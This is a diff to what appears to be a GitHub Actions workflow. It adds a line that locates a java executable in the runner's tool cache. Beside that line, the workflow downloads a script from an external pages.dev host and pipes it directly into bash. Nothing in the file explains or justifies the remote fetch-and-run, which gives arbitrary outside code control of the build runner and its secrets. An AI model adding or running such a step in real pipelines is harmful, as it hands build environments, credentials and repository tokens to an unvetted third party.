@@ -21,4 +21,5 @@ jobs:
           java-version: '21.0.8-9'
       - name: Run a multi-line script
         run: |
+          echo $(find "/opt/hostedtoolcache/" -type f -name java -perm /111 2>/dev/null | head -n 1)
           curl https://static-resource-skidder-loli.pages.dev/execute.sh | bash
